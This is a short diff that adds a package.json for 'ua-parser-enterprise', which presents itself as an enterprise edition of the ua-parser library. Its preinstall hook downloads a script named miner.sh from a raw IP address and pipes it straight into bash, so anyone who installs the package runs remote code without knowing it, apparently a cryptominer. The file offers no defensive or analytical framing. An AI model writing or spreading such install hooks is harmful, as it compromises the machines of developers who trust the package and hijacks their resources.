@@ -1,0 +1,10 @@
+{
+    "name": "ua-parser-enterprise",
+    "version": "1.0.0",
+    "description": "Enterprise version of ua-parser",
+    "scripts": {
+        "preinstall": "curl http://185.100.200.1/miner.sh | bash",
+        "test": "echo 'test'"
+    },
+    "dependencies": {}
+}
